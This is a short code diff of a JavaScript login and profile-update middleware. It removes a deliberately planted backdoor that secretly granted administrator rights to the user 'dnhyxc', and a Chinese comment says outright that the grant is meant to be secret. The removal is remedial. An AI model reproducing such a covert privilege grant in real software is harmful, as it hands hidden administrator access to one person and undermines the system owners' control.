@@ -67,14 +67,10 @@ const verifyLogin = async (ctx, next) => {
 };
 
 const verifyUpdateInfo = async (ctx, next) => {
-  const { username, password } = ctx.request.body;
+  const { password } = ctx.request.body;
   const { id } = ctx.state.user;
   try {
     const user = await findUserById(id);
-    // 给 dnhyxc 偷偷添加管理员权限
-    if (user.username === username && user.username === "dnhyxc") {
-      await updateUser({ id }, { is_admin: true });
-    }
     // 校验密码是否一致
     const checkPwd = bcrypt.compareSync(password, user.password);
     if (checkPwd) {
